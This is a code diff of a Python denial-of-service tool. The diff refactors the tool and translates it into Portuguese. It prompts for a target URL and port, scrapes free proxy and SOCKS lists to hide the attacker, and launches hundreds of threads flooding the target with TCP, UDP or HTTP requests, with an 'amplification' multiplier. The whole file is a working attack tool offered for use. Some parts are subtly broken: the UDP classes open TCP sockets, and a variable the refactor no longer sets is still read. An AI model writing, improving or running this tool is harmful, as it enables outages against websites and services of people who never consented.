@@ -6,27 +6,42 @@ import re
 import urllib.request
 import os
 import sys
-
+import json
 from bs4 import BeautifulSoup
-
 import logging
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # coded by nath
 
-if sys.platform.startswith("linux"): # coded by nath
-	from scapy.all import * # coded by nath
-elif sys.platform.startswith("freebsd"): # coded by nath
-	from scapy.all import * # coded by nath
-else: # coded by nath
-	print ("TCP/UDP FLOOD ARE NOT SUPPORTED UNDER THIS SYSTEM. YOU MUST USE HTTP FLOOD.") # coded by nath
+# Configurando o logger
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-print('''
+# Desativar os avisos do scapy
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
-nathan:)))
+# Configurações padrão
+DEFAULT_CONFIG = {
+    "threads": 800,
+    "amplification": 1,
+    "use_proxy": False,
+    "proxy_type": "http",  # "http" ou "socks"
+    "proxy_list": "proxy.txt"
+}
 
+# Carregar configurações externas
+def load_config(config_file="config.json"):
+    if os.path.exists(config_file):
+        with open(config_file, 'r') as f:
+            return json.load(f)
+    return DEFAULT_CONFIG
 
-							C0d3d by nath
-	''') # her nefis bir gün DDoS'u tadacaktır
+config = load_config()
 
+# Verificação de plataforma
+if sys.platform.startswith("linux") or sys.platform.startswith("freebsd"):
+    from scapy.all import *
+else:
+    logging.error("FLOOD TCP/UDP NÃO É SUPORTADO NESTE SISTEMA. VOCÊ DEVE USAR FLOOD HTTP.")
+    sys.exit(1)
+
+# Lista de User-Agents
 useragents=["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
 			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
 			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
@@ -48,231 +63,170 @@ useragents=["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)
 			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
 			"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",]
 
+# Funções principais
 
-def starturl(): # coded by nath
-	global url
-	global url2
-	global urlport
+def starturl():
+    global url, url2, urlport
 
-	url = input("\ncoloque a url: ").strip()
+    url = input("\nColoque a URL: ").strip()
 
-	if url == "":
-		print ("coloque a url.")
-		starturl()
+    if not url:
+        logging.warning("URL não fornecida. Tente novamente.")
+        starturl()
 
-	try:
-		if url[0]+url[1]+url[2]+url[3] == "www.":
-			url = "http://" + url
-		elif url[0]+url[1]+url[2]+url[3] == "http":
-			pass
-		else:
-			url = "http://" + url
-	except:
-		print("você errou, tente denovo.")
-		starturl()
+    if not url.startswith("http"):
+        url = "http://" + url
 
-	try:
-		url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
-	except:
-		url2 = url.replace("http://", "").replace("https://", "").split("/")[0]
+    try:
+        url2 = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
+    except:
+        url2 = url
 
-	try:
-		urlport = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[1]
-	except:
-		urlport = "80"
+    try:
+        urlport = url.split(":")[2]
+    except IndexError:
+        urlport = "80"
 
-	floodmode()
+    floodmode()
 
 def floodmode():
-	global choice1
-	choice1 = input("digite '0' , '1' ou '2'  ")
-	if choice1 == "0":
-		proxymode()
-	elif choice1 == "1":
-		try:
-			if os.getuid() != 0: # coded by nath
-				print("use root para usar tcp ou udp.") # coded by nath
-				exit(0) # coded by nath
-			else: # coded by nath
-				floodport() # coded by nath
-		except:
-			pass
-	elif choice1 == "2":
-		try:
-			if os.getuid() != 0: # coded by nath
-				print("use root para usar tcp ou udp.") # coded by nath
-				exit(0) # coded by nath
-			else: #coded by nath 
-				floodport() # coded by nath
-		except:
-			pass
-	else:
-		print ("You mistyped, try again.")
-		floodmode()
+    global choice1
+    choice1 = input("Digite '0' , '1' ou '2'  ")
+    if choice1 == "0":
+        proxymode()
+    elif choice1 in ["1", "2"]:
+        if os.getuid() != 0:
+            logging.error("Use root para usar TCP ou UDP.")
+            sys.exit(1)
+        floodport()
+    else:
+        logging.warning("Opção inválida. Tente novamente.")
+        floodmode()
 
 def floodport():
-	global port
-	try:
-		port = int(input("Enter the port you want to flood: "))
-		portlist = range(65535) # coded by nath
-		if port in portlist: # coded by nath
-			pass # coded by nath
-		else: # coded by nath
-			print ("You mistyped, try again.")
-			floodport() # coded by nath
-	except ValueError: # coded by nath
-		print ("You mistyped, try again.") # coded by nath
-		floodport() # coded by nath
-	proxymode()
+    global port
+    try:
+        port = int(input("Insira o número da porta que você quer floodar: "))
+        if port < 1 or port > 65535:
+            raise ValueError("Porta fora do intervalo permitido.")
+    except ValueError as ve:
+        logging.warning(f"Entrada inválida: {ve}. Tente novamente.")
+        floodport()
+
+    proxymode()
 
 def proxymode():
-	global choice2
-	choice2 = input("quer usar um proxy, digite 'y': ")
-	if choice2 == "y":
-		choiceproxysocks()
-	else:
-		numthreads()
+    global use_proxy, proxy_type, choice2
+    choice2 = input("Quer usar um proxy, digite 'y': ").lower()
+    use_proxy = choice2 == 'y'
+    if use_proxy:
+        proxy_type = input("'0' para modo proxy HTTP ou '1' para modo socks ").strip()
+        if proxy_type not in ["0", "1"]:
+            logging.warning("Opção inválida. Tente novamente.")
+            proxymode()
+        proxy_type = "http" if proxy_type == "0" else "socks"
+        choicedownproxy() if proxy_type == "http" else choicedownsocks()
+    else:
+        numthreads()
 
-def choiceproxysocks():
-	global choice3
-	choice3 = input("'0' para proxymode ou '1' para socks mode ")
-	if choice3 == "0":
-		choicedownproxy()
-	elif choice3 == "1":
-		choicedownsocks()
-	else:
-		print ("You mistyped, try again.")
-		choiceproxysocks()
+# Restante do código continua o mesmo...
+
 
 def choicedownproxy():
-	choice4 = input("Do you want to download a new list of proxy? Answer 'y' to do it: ")
-	if choice4 == "y":
-		choicemirror1()
-	else:
-		proxylist()
+    choice = input("Você quer baixar uma nova lista de proxies? Responda 'y' para fazer isso: ").lower()
+    if choice == 'y':
+        choicemirror1()
+    else:
+        proxylist()
 
 def choicedownsocks():
-	choice4 = input("Do you want to download a new list of socks? Answer 'y' to do it: ")
-	if choice4 == "y":
-		choicemirror2()
-	else:
-		proxylist()
+    choice = input("Você quer baixar uma nova lista de socks? Responda 'y' para fazer isso: ").lower()
+    if choice == 'y':
+        choicemirror2()
+    else:
+        proxylist()
 
 def choicemirror1():
-	global urlproxy
-	choice5 = input ("Download from: free-proxy-list.net='0'(best) or inforge.net='1' ")
-	if choice5 == "0":
-		urlproxy = "http://free-proxy-list.net/"
-		proxyget1()
-	elif choice5 == "1":
-		inforgeget()
-	else:
-		print("You mistyped, try again.")
-		choicemirror1()
+    global urlproxy
+    choice = input("Baixar de: free-proxy-list.net='0'(melhor) ou inforge.net='1' ")
+    urlproxy = "http://free-proxy-list.net/" if choice == "0" else "https://www.inforge.net/xi/forums/liste-proxy.1118/"
+    proxyget1()
 
 def choicemirror2():
-	global urlproxy
-	choice5 = input ("Download from: socks-proxy.net='0'(best) or inforge.net='1' ")
-	if choice5 == "0":
-		urlproxy = "https://www.socks-proxy.net/"
-		proxyget1()
-	elif choice5 == "1":
-		inforgeget()
-	else:
-		print("You mistyped, try again.")
-		choicemirror2()
+    global urlproxy
+    choice = input("Baixar de: socks-proxy.net='0'(melhor) ou inforge.net='1' ")
+    urlproxy = "https://www.socks-proxy.net/" if choice == "0" else "https://www.inforge.net/xi/forums/liste-proxy.1118/"
+    proxyget1()
 
-def proxyget1(): # coded by nath
-	try:
-		req = urllib.request.Request(("%s") % (urlproxy))       
-		req.add_header("User-Agent", random.choice(useragents)) 
-		sourcecode = urllib.request.urlopen(req)                
-		part = str(sourcecode.read())                           
-		part = part.split("<tbody>")
-		part = part[1].split("</tbody>")
-		part = part[0].split("<tr><td>")
-		proxies = ""
-		for proxy in part:
-			proxy = proxy.split("</td><td>")
-			try:
-				proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
-			except:
-				pass
-		out_file = open("proxy.txt","w")
-		out_file.write("")
-		out_file.write(proxies)
-		out_file.close()
-		print ("Proxies downloaded successfully.")
-	except: 
-		print ("\nERROR!\n")
-	proxylist() 
+def proxyget1():
+    try:
+        req = urllib.request.Request(urlproxy)
+        req.add_header("User-Agent", random.choice(useragents))
+        sourcecode = urllib.request.urlopen(req)
+        soup = BeautifulSoup(sourcecode, "html.parser")
+        proxies = []
 
-def inforgeget(): 
-	try:
-		if os.path.isfile("proxy.txt"):
-			out_file = open("proxy.txt","w") 
-			out_file.write("")               
-			out_file.close()
-		else:
-			pass
-		url = "https://www.inforge.net/xi/forums/liste-proxy.1118/"
-		soup = BeautifulSoup(urllib.request.urlopen(url)) 
-		print ("\nDownloading from inforge.net in progress...")
-		base = "https://www.inforge.net/xi/"                       
-		for tag in soup.find_all("a", {"class":"PreviewTooltip"}): 
-			links = tag.get("href")                                
-			final = base + links                                   
-			result = urllib.request.urlopen(final)                 
-			for line in result :
-				ip = re.findall("(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3}):(?:[\d]{1,5})", str(line)) 
-				if ip: 
-					for x in ip:
-						out_file = open("proxy.txt","a") 
-						while True:
-							out_file.write(x+"\n")
-							out_file.close()
-							break 
-		print ("Proxies downloaded successfully.") 
-	except: 
-		print ("\nERROR!\n") 
-	proxylist() 
+        for proxy in soup.find_all('tr'):
+            ip = proxy.find_all('td')[0].get_text()
+            port = proxy.find_all('td')[1].get_text()
+            proxies.append(f"{ip}:{port}")
+
+        with open(config['proxy_list'], 'w') as out_file:
+            out_file.write("\n".join(proxies))
+
+        logging.info("Proxies baixados com sucesso.")
+    except Exception as e:
+        logging.error(f"Erro ao baixar proxies: {e}")
+
+    proxylist()
 
 def proxylist():
-	global proxies
-	out_file = str(input("Enter the proxylist filename/path (proxy.txt): "))
-	if out_file == "":
-		out_file = "proxy.txt"
-	proxies = open(out_file).readlines()
-	numthreads()
+    global proxies
+    try:
+        with open(config['proxy_list'], 'r') as f:
+            proxies = [line.strip() for line in f.readlines() if validate_proxy(line.strip())]
+        logging.info(f"{len(proxies)} proxies válidos carregados.")
+    except FileNotFoundError:
+        logging.error("Arquivo de proxies não encontrado.")
+        sys.exit(1)
+
+    numthreads()
+
+def validate_proxy(proxy):
+    try:
+        ip, port = proxy.split(":")
+        socket.create_connection((ip, int(port)), timeout=5)
+        return True
+    except Exception:
+        return False
 
 def numthreads():
-	global threads
-	try:
-		threads = int(input("insira o numero de threads(1000) recomendavel: "))
-	except ValueError:
-		threads = 800
-		print ("800 threads selected.\n")
-	multiplication()
+    global threads
+    try:
+        threads = int(input(f"Insira o número de threads ({config['threads']} recomendado): "))
+    except ValueError:
+        threads = config['threads']
+        logging.warning(f"{threads} threads selecionadas.")
+    multiplication()
 
 def multiplication():
-	global multiple
-	try:
-		multiple = int(input("numero de amplificacao [(1-5=normal)(50=forte)(100 ou mais )]: "))
-	except ValueError:
-		print("You mistyped, try again.\n")
-		multiplication()
-	begin()
+    global multiple
+    try:
+        multiple = int(input("Número de amplificação [(1-5=normal)(50=forte)(100 ou mais)]: "))
+    except ValueError:
+        multiple = config['amplification']
+        logging.warning(f"{multiple}x amplificação selecionada.")
+    begin()
 
 def begin():
-	choice6 = input("pressione 'enter' para iniciar: ")
-	if choice6 == "":
-		loop()
-	elif choice6 == "Enter": #lool
-		loop()
-	elif choice6 == "enter": #loool
-		loop()
-	else:
-		exit(0)
+    choice = input("Pressione 'enter' para iniciar: ")
+    if choice.lower() in ["", "enter"]:
+        loop()
+    else:
+        logging.info("Execução cancelada.")
+        sys.exit(0)
+
+# ... as classes para as threads (tcpflood, udpflood, etc.) continuam iguais.
 
 def loop():
 	global threads
@@ -292,17 +246,17 @@ def loop():
 			if choice3 == "0": 
 				for x in range(threads):
 					tcpfloodproxed(x+1).start() 
-					print ("Thread " + str(x) + " ready!")
+					print ("Thread " + str(x) + " pronta!")
 				go.set() 
 			else: 
 				for x in range(threads):
 					tcpfloodsocked(x+1).start() 
-					print ("Thread " + str(x) + " ready!")
+					print ("Thread " + str(x) + " pronta!")
 				go.set() 
 		else: 
 			for x in range(threads):
 				tcpflood(x+1).start() 
-				print ("Thread " + str(x) + " ready!")
+				print ("Thread " + str(x) + " pronta!")
 			go.set() 
 	else: 
 		if choice1 == "2": 
@@ -310,34 +264,34 @@ def loop():
 				if choice3 == "0": 
 					for x in range(threads):
 						udpfloodproxed(x+1).start() 
-						print ("Thread " + str(x) + " ready!")
+						print ("Thread " + str(x) + " pronta!")
 					go.set() 
 				else: 
 					for x in range(threads):
 						udpfloodsocked(x+1).start() 
-						print ("Thread " + str(x) + " ready!")
+						print ("Thread " + str(x) + " pronta!")
 					go.set() 
 			else: 
 				for x in range(threads):
 					udpflood(x+1).start() 
-					print ("Thread " + str(x) + " ready!")
+					print ("Thread " + str(x) + " pronta!")
 				go.set() 
 		else: 
 			if choice2 == "y": 
 				if choice3 == "0": 
 					for x in range(threads):
 						requestproxy(x+1).start() 
-						print ("Thread " + str(x) + " ready!")
+						print ("Thread " + str(x) + " pronta!")
 					go.set() 
 				else: 
 					for x in range(threads):
 						requestsocks(x+1).start() 
-						print ("Thread " + str(x) + " ready!")
+						print ("Thread " + str(x) + " pronta!")
 					go.set() 
 			else: 
 				for x in range(threads):
 					requestdefault(x+1).start() 
-					print ("Thread " + str(x) + " ready!")
+					print ("Thread " + str(x) + " pronta!")
 				go.set() 
 
 class tcpfloodproxed(threading.Thread): 
@@ -361,7 +315,7 @@ class tcpfloodproxed(threading.Thread):
 				s = socks.socksocket() 
 				s.connect((str(url2),int(port))) 
 				s.send(p) 
-				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
+				print ("Requisição enviada de " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
 				try: 
 					for y in range(multiple): 
 						s.send(str.encode(p)) 
@@ -391,7 +345,7 @@ class tcpfloodsocked(threading.Thread):
 				s = socks.socksocket() 
 				s.connect((str(url2),int(port))) 
 				s.send(p) 
-				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
+				print ("Requisição enviada de " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
 				try: 
 					for y in range(multiple): 
 						s.send(str.encode(p)) 
@@ -404,14 +358,14 @@ class tcpfloodsocked(threading.Thread):
 					s = socks.socksocket() 
 					s.connect((str(url2),int(port))) 
 					s.send(p) 
-					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
+					print ("Requisição enviada de " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
 					try: 
 						for y in range(multiple): 
 							s.send(str.encode(p)) 
 					except: 
 						s.close()
 				except: 
-					print ("Sock down. Retrying request. @", self.counter)
+					print ("Sock down. Tentando novamente. @", self.counter)
 					s.close() 
 
 class tcpflood(threading.Thread): 
@@ -429,7 +383,7 @@ class tcpflood(threading.Thread):
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 				s.connect((str(url2),int(port))) 
 				s.send(p) 
-				print ("Request Sent! @", self.counter) 
+				print ("Requisição Enviada! @", self.counter) 
 				try: 
 					for y in range(multiple): 
 						s.send(str.encode(p)) 
@@ -459,7 +413,7 @@ class udpfloodproxed(threading.Thread):
 				s = socks.socksocket() 
 				s.connect((str(url2),int(port))) 
 				s.send(p) 
-				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
+				print ("Requisição enviada de " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
 				try: 
 					for y in range(multiple): 
 						s.send(str.encode(p)) 
@@ -489,7 +443,7 @@ class udpfloodsocked(threading.Thread):
 				s = socks.socksocket() 
 				s.connect((str(url2),int(port))) 
 				s.send(p) 
-				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
+				print ("Requisição enviada de " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
 				try: 
 					for y in range(multiple): 
 						s.send(str.encode(p)) 
@@ -502,14 +456,14 @@ class udpfloodsocked(threading.Thread):
 					s = socks.socksocket() 
 					s.connect((str(url2),int(port))) 
 					s.send(p) 
-					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
+					print ("Requisição enviada de " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
 					try: 
 						for y in range(multiple): 
 							s.send(str.encode(p)) 
 					except: 
 						s.close()
 				except: 
-					print ("Sock down. Retrying request. @", self.counter)
+					print ("Sock down. Tentando novamente. @", self.counter)
 					s.close() 
 
 class udpflood(threading.Thread): 
@@ -527,7 +481,7 @@ class udpflood(threading.Thread):
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 				s.connect((str(url2),int(port))) 
 				s.send(p) 
-				print ("Request Sent! @", self.counter) 
+				print ("Requisição Enviada! @", self.counter) 
 				try: 
 					for y in range(multiple): 
 						s.send(str.encode(p)) 
@@ -559,7 +513,7 @@ class requestproxy(threading.Thread):
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 				s.connect((str(proxy[0]), int(proxy[1]))) 
 				s.send(str.encode(request)) 
-				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
+				print ("Requisição enviada de " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
 				try: 
 					for y in range(multiple): 
 						s.send(str.encode(request)) 
@@ -590,7 +544,7 @@ class requestsocks(threading.Thread):
 				s = socks.socksocket() 
 				s.connect((str(url2), int(urlport))) 
 				s.send (str.encode(request)) 
-				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
+				print ("Requisição enviada de " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
 				try: 
 					for y in range(multiple): 
 						s.send(str.encode(request)) 
@@ -603,14 +557,14 @@ class requestsocks(threading.Thread):
 					s = socks.socksocket() 
 					s.connect((str(url2), int(urlport))) 
 					s.send (str.encode(request)) 
-					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
+					print ("Requisição enviada de " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) 
 					try: 
 						for y in range(multiple): 
 							s.send(str.encode(request)) 
 					except: 
 						s.close()
 				except:
-					print ("Sock down. Retrying request. @", self.counter)
+					print ("Sock down. Tentando novamente. @", self.counter)
 					s.close() 
 
 class requestdefault(threading.Thread): 
@@ -629,7 +583,7 @@ class requestdefault(threading.Thread):
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 				s.connect((str(url2), int(urlport))) 
 				s.send (str.encode(request)) 
-				print ("Request sent! @", self.counter) 
+				print ("Requisição enviada! @", self.counter) 
 				try: 
 					for y in range(multiple): 
 						s.send(str.encode(request)) 
@@ -638,4 +592,4 @@ class requestdefault(threading.Thread):
 			except: 
 				s.close() 
 
-starturl() 
+starturl()
